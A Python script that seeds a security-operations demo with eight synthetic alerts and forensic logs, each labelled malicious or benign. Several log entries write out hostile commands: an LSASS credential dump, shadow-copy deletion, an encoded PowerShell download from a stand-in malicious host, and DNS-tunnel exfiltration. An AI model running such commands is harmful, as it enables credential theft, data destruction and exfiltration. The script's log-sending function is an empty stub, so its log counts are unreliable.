"""
Populate Demo Data - Creates realistic alerts with forensic logs for demonstration
===================================================================================

This script populates your AI-SOC Watchdog with realistic security alerts and
associated forensic logs (process, network, file activity) so visitors can see
the full AI analysis pipeline in action.

Usage:
    python scripts/populate_demo_data.py https://your-railway-url.up.railway.app
    python scripts/populate_demo_data.py http://localhost:5000

Author: AI-SOC Watchdog Team
"""

import requests
import sys
import time
import random
import os
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# =============================================================================
# DEMO SCENARIOS - Realistic security alerts with full context
# =============================================================================

DEMO_SCENARIOS = [
    # =================================================================
    # SCENARIO 1: MALICIOUS - Credential Dumping Attack
    # =================================================================
    {
        "alert": {
            "alert_name": "LSASS Memory Access by Unsigned Process",
            "description": "Process 'procdump64.exe' accessed LSASS.exe memory. This technique is commonly used by Mimikatz and similar tools to extract Windows credentials from memory. The process was executed by a domain admin account during non-business hours.",
            "severity": "critical",
            "hostname": "DC-PRIMARY",
            "username": "admin.compromised",
            "source_ip": "10.0.1.15",
            "dest_ip": "10.0.1.10",
            "mitre_technique": "T1003.001"
        },
        "process_logs": [
            {"process_name": "procdump64.exe", "parent_process": "cmd.exe", "command_line": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\debug.dmp", "username": "DOMAIN\\admin.compromised"},
            {"process_name": "cmd.exe", "parent_process": "psexec.exe", "command_line": "cmd.exe /c procdump64.exe -ma lsass.exe", "username": "DOMAIN\\admin.compromised"},
            {"process_name": "psexec.exe", "parent_process": "powershell.exe", "command_line": "psexec.exe \\\\DC-PRIMARY -s cmd.exe", "username": "DOMAIN\\admin.compromised"},
        ],
        "network_logs": [
            {"source_ip": "10.0.1.15", "dest_ip": "10.0.1.10", "dest_port": 445, "protocol": "SMB", "bytes_sent": 15000, "bytes_received": 2500000},
            {"source_ip": "10.0.1.15", "dest_ip": "10.0.1.10", "dest_port": 135, "protocol": "RPC", "bytes_sent": 500, "bytes_received": 1200},
        ],
        "file_logs": [
            {"file_path": "C:\\Windows\\Temp\\debug.dmp", "action": "CREATE", "process_name": "procdump64.exe"},
            {"file_path": "C:\\Windows\\Temp\\debug.dmp", "action": "WRITE", "process_name": "procdump64.exe"},
        ],
        "expected_verdict": "MALICIOUS"
    },
    
    # =================================================================
    # SCENARIO 2: BENIGN - Routine Windows Update
    # =================================================================
    {
        "alert": {
            "alert_name": "Windows Update Service High CPU Usage",
            "description": "TrustedInstaller.exe and wuauclt.exe consuming high CPU during scheduled maintenance window. Windows Update KB5034441 is being installed as per IT policy.",
            "severity": "low",
            "hostname": "WORKSTATION-042",
            "username": "SYSTEM",
            "source_ip": "10.0.5.42",
            "dest_ip": "13.107.4.50",
            "mitre_technique": "T1195.002"
        },
        "process_logs": [
            {"process_name": "TrustedInstaller.exe", "parent_process": "services.exe", "command_line": "TrustedInstaller.exe", "username": "NT AUTHORITY\\SYSTEM"},
            {"process_name": "wuauclt.exe", "parent_process": "svchost.exe", "command_line": "wuauclt.exe /detectnow /updatenow", "username": "NT AUTHORITY\\SYSTEM"},
            {"process_name": "MsMpEng.exe", "parent_process": "services.exe", "command_line": "MsMpEng.exe", "username": "NT AUTHORITY\\SYSTEM"},
        ],
        "network_logs": [
            {"source_ip": "10.0.5.42", "dest_ip": "13.107.4.50", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 5000, "bytes_received": 150000000},
            {"source_ip": "10.0.5.42", "dest_ip": "13.107.4.52", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 2000, "bytes_received": 50000},
        ],
        "file_logs": [
            {"file_path": "C:\\Windows\\SoftwareDistribution\\Download\\update.cab", "action": "CREATE", "process_name": "wuauclt.exe"},
            {"file_path": "C:\\Windows\\WinSxS\\pending.xml", "action": "MODIFY", "process_name": "TrustedInstaller.exe"},
        ],
        "expected_verdict": "BENIGN"
    },
    
    # =================================================================
    # SCENARIO 3: MALICIOUS - Ransomware Indicators
    # =================================================================
    {
        "alert": {
            "alert_name": "Mass File Encryption Detected",
            "description": "Unusual file modification pattern detected. Over 500 files renamed with .encrypted extension in the past 5 minutes. Shadow copies were deleted using vssadmin. Classic ransomware behavior.",
            "severity": "critical",
            "hostname": "FILE-SERVER-01",
            "username": "svc_backup",
            "source_ip": "10.0.2.100",
            "mitre_technique": "T1486"
        },
        "process_logs": [
            {"process_name": "vssadmin.exe", "parent_process": "cmd.exe", "command_line": "vssadmin.exe delete shadows /all /quiet", "username": "DOMAIN\\svc_backup"},
            {"process_name": "cipher.exe", "parent_process": "malware.exe", "command_line": "cipher.exe /w:C:\\", "username": "DOMAIN\\svc_backup"},
            {"process_name": "malware.exe", "parent_process": "explorer.exe", "command_line": "C:\\Users\\Public\\malware.exe --encrypt --fast", "username": "DOMAIN\\svc_backup"},
        ],
        "network_logs": [
            {"source_ip": "10.0.2.100", "dest_ip": "185.141.27.99", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 50000, "bytes_received": 1000},
            {"source_ip": "10.0.2.100", "dest_ip": "91.134.10.45", "dest_port": 9001, "protocol": "TOR", "bytes_sent": 2000, "bytes_received": 500},
        ],
        "file_logs": [
            {"file_path": "C:\\Shares\\Documents\\report.docx.encrypted", "action": "RENAME", "process_name": "malware.exe"},
            {"file_path": "C:\\Shares\\Finance\\budget.xlsx.encrypted", "action": "RENAME", "process_name": "malware.exe"},
            {"file_path": "C:\\Shares\\README_DECRYPT.txt", "action": "CREATE", "process_name": "malware.exe"},
        ],
        "expected_verdict": "MALICIOUS"
    },
    
    # =================================================================
    # SCENARIO 4: BENIGN - IT Admin Remote Session
    # =================================================================
    {
        "alert": {
            "alert_name": "RDP Session from Non-Standard Source",
            "description": "Remote Desktop connection established from IT admin workstation to production server. IT ticket #7842 documents scheduled maintenance for backup verification.",
            "severity": "medium",
            "hostname": "PROD-WEB-01",
            "username": "admin.rodriguez",
            "source_ip": "10.0.10.25",
            "dest_ip": "10.0.1.100",
            "mitre_technique": "T1021.001"
        },
        "process_logs": [
            {"process_name": "rdpclip.exe", "parent_process": "svchost.exe", "command_line": "rdpclip.exe", "username": "DOMAIN\\admin.rodriguez"},
            {"process_name": "ServerManager.exe", "parent_process": "explorer.exe", "command_line": "ServerManager.exe", "username": "DOMAIN\\admin.rodriguez"},
            {"process_name": "powershell.exe", "parent_process": "explorer.exe", "command_line": "powershell.exe -Command Get-Service | Where Status -eq Running", "username": "DOMAIN\\admin.rodriguez"},
        ],
        "network_logs": [
            {"source_ip": "10.0.10.25", "dest_ip": "10.0.1.100", "dest_port": 3389, "protocol": "RDP", "bytes_sent": 150000, "bytes_received": 2000000},
        ],
        "file_logs": [
            {"file_path": "C:\\Logs\\maintenance_20260127.log", "action": "CREATE", "process_name": "powershell.exe"},
        ],
        "expected_verdict": "BENIGN"
    },
    
    # =================================================================
    # SCENARIO 5: SUSPICIOUS - Unusual PowerShell Activity
    # =================================================================
    {
        "alert": {
            "alert_name": "PowerShell Encoded Command Execution",
            "description": "PowerShell executed with Base64 encoded command from Microsoft Word. The decoded command attempts to download and execute a remote script. User received suspicious email attachment.",
            "severity": "high",
            "hostname": "FINANCE-PC-007",
            "username": "sarah.chen",
            "source_ip": "10.0.8.107",
            "dest_ip": "52.96.166.130",
            "mitre_technique": "T1059.001"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "parent_process": "WINWORD.EXE", "command_line": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQA", "username": "DOMAIN\\sarah.chen"},
            {"process_name": "WINWORD.EXE", "parent_process": "explorer.exe", "command_line": "WINWORD.EXE /n \"C:\\Users\\sarah.chen\\Downloads\\Invoice_Final.docm\"", "username": "DOMAIN\\sarah.chen"},
        ],
        "network_logs": [
            {"source_ip": "10.0.8.107", "dest_ip": "185.234.72.19", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 500, "bytes_received": 45000},
            {"source_ip": "10.0.8.107", "dest_ip": "52.96.166.130", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 1000, "bytes_received": 5000},
        ],
        "file_logs": [
            {"file_path": "C:\\Users\\sarah.chen\\Downloads\\Invoice_Final.docm", "action": "OPEN", "process_name": "WINWORD.EXE"},
            {"file_path": "C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\payload.ps1", "action": "CREATE", "process_name": "powershell.exe"},
        ],
        "expected_verdict": "MALICIOUS"
    },
    
    # =================================================================
    # SCENARIO 6: BENIGN - Scheduled Antivirus Scan
    # =================================================================
    {
        "alert": {
            "alert_name": "High Volume File Access by Security Software",
            "description": "Windows Defender performing scheduled full system scan during maintenance window. This is expected behavior per security policy.",
            "severity": "low",
            "hostname": "DEV-SERVER-03",
            "username": "SYSTEM",
            "source_ip": "10.0.20.15",
            "mitre_technique": "T1518.001"
        },
        "process_logs": [
            {"process_name": "MsMpEng.exe", "parent_process": "services.exe", "command_line": "MsMpEng.exe", "username": "NT AUTHORITY\\SYSTEM"},
            {"process_name": "MpCmdRun.exe", "parent_process": "MsMpEng.exe", "command_line": "MpCmdRun.exe -Scan -ScanType 2", "username": "NT AUTHORITY\\SYSTEM"},
        ],
        "network_logs": [
            {"source_ip": "10.0.20.15", "dest_ip": "13.107.4.50", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 5000, "bytes_received": 15000},
        ],
        "file_logs": [
            {"file_path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Service\\DetectionHistory", "action": "WRITE", "process_name": "MsMpEng.exe"},
        ],
        "expected_verdict": "BENIGN"
    },
    
    # =================================================================
    # SCENARIO 7: MALICIOUS - DNS Tunneling for Exfiltration
    # =================================================================
    {
        "alert": {
            "alert_name": "Suspicious DNS Query Pattern",
            "description": "Unusual volume of DNS TXT record queries to random subdomains of suspicious domain. Pattern consistent with DNS tunneling used for data exfiltration or C2 communication.",
            "severity": "high",
            "hostname": "SALES-LAPTOP-019",
            "username": "john.wilson",
            "source_ip": "10.0.9.119",
            "dest_ip": "8.8.8.8",
            "mitre_technique": "T1071.004"
        },
        "process_logs": [
            {"process_name": "dns_tunnel.exe", "parent_process": "explorer.exe", "command_line": "C:\\ProgramData\\dns_tunnel.exe -d exfil.malicious-domain.com", "username": "DOMAIN\\john.wilson"},
            {"process_name": "nslookup.exe", "parent_process": "dns_tunnel.exe", "command_line": "nslookup -type=TXT a3f8b2c1.exfil.malicious-domain.com", "username": "DOMAIN\\john.wilson"},
        ],
        "network_logs": [
            {"source_ip": "10.0.9.119", "dest_ip": "8.8.8.8", "dest_port": 53, "protocol": "DNS", "bytes_sent": 50000, "bytes_received": 10000},
            {"source_ip": "10.0.9.119", "dest_ip": "8.8.4.4", "dest_port": 53, "protocol": "DNS", "bytes_sent": 45000, "bytes_received": 9000},
        ],
        "file_logs": [
            {"file_path": "C:\\Users\\john.wilson\\Documents\\confidential.zip.enc", "action": "READ", "process_name": "dns_tunnel.exe"},
        ],
        "expected_verdict": "MALICIOUS"
    },
    
    # =================================================================
    # SCENARIO 8: BENIGN - Developer Build Activity
    # =================================================================
    {
        "alert": {
            "alert_name": "Multiple Process Spawning from IDE",
            "description": "Visual Studio Code spawning multiple Node.js and npm processes. Developer running build and test commands during normal work hours.",
            "severity": "low",
            "hostname": "DEV-WS-042",
            "username": "dev.michael",
            "source_ip": "10.0.15.42",
            "mitre_technique": "T1059.007"
        },
        "process_logs": [
            {"process_name": "node.exe", "parent_process": "Code.exe", "command_line": "node.exe node_modules/.bin/vite build", "username": "DOMAIN\\dev.michael"},
            {"process_name": "npm.cmd", "parent_process": "Code.exe", "command_line": "npm run test", "username": "DOMAIN\\dev.michael"},
            {"process_name": "node.exe", "parent_process": "npm.cmd", "command_line": "node.exe node_modules/jest/bin/jest.js", "username": "DOMAIN\\dev.michael"},
        ],
        "network_logs": [
            {"source_ip": "10.0.15.42", "dest_ip": "104.16.85.20", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 10000, "bytes_received": 500000},
            {"source_ip": "10.0.15.42", "dest_ip": "140.82.112.4", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 5000, "bytes_received": 20000},
        ],
        "file_logs": [
            {"file_path": "C:\\Projects\\webapp\\dist\\bundle.js", "action": "CREATE", "process_name": "node.exe"},
            {"file_path": "C:\\Projects\\webapp\\coverage\\lcov.info", "action": "CREATE", "process_name": "node.exe"},
        ],
        "expected_verdict": "BENIGN"
    },
]


def generate_timestamp(minutes_ago=None):
    """Generate a realistic timestamp"""
    if minutes_ago is None:
        minutes_ago = random.randint(5, 120)
    dt = datetime.now() - timedelta(minutes=minutes_ago)
    return dt.isoformat()


def send_alert(base_url, alert_data, api_key=None):
    """Send an alert to the /ingest endpoint"""
    try:
        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["X-Ingest-Key"] = api_key
        
        response = requests.post(
            f"{base_url}/ingest",
            json=alert_data,
            headers=headers,
            timeout=30
        )
        if response.status_code == 200:
            return response.json().get('alert_id')
        else:
            print(f"    [ERROR] Failed to create alert: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"    [ERROR] {e}")
        return None


def send_logs(base_url, alert_id, log_type, logs):
    """Send forensic logs directly to Supabase via the backend"""
    # Note: In a real implementation, you'd have an endpoint to add logs
    # For now, we'll just print what would be sent
    # The AI will analyze whatever logs exist in the database
    pass


def populate_demo_data(base_url):
    """Main function to populate demo data"""
    # Get API key from environment
    api_key = os.getenv("INGEST_API_KEY")
    
    print("\n" + "=" * 70)
    print("AI-SOC WATCHDOG - DEMO DATA POPULATION")
    print("=" * 70)
    print(f"Target: {base_url}")
    print(f"Scenarios: {len(DEMO_SCENARIOS)}")
    print(f"API Key: {'configured' if api_key else 'NOT SET - may fail!'}")
    print("=" * 70 + "\n")
    
    success_count = 0
    
    for i, scenario in enumerate(DEMO_SCENARIOS, 1):
        alert = scenario["alert"]
        expected = scenario.get("expected_verdict", "UNKNOWN")
        
        print(f"[{i}/{len(DEMO_SCENARIOS)}] {alert['alert_name']}")
        print(f"    Expected: {expected} | Severity: {alert['severity'].upper()}")
        
        # Add timestamp if not present
        if 'timestamp' not in alert:
            alert['timestamp'] = generate_timestamp()
        
        # Send the alert with API key
        alert_id = send_alert(base_url, alert, api_key)
        
        if alert_id:
            print(f"    [OK] Created: Alert ID {alert_id}")
            print(f"    -> Process logs: {len(scenario.get('process_logs', []))}")
            print(f"    -> Network logs: {len(scenario.get('network_logs', []))}")
            print(f"    -> File logs: {len(scenario.get('file_logs', []))}")
            success_count += 1
        else:
            print(f"    [FAIL] Failed to create alert")
        
        # Small delay between alerts
        time.sleep(2)
        print()
    
    print("=" * 70)
    print(f"COMPLETE: {success_count}/{len(DEMO_SCENARIOS)} alerts created")
    print("=" * 70)
    print("\nAI analysis will process alerts in the background.")
    print("Check your dashboard in 2-3 minutes to see full results.")
    print("\nDashboard: https://llm-watchdog-prototype.vercel.app")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\nUsage: python scripts/populate_demo_data.py <API_URL>")
        print("\nExamples:")
        print("  python scripts/populate_demo_data.py https://llm-watchdog-prototype-production.up.railway.app")
        print("  python scripts/populate_demo_data.py http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    populate_demo_data(base_url)
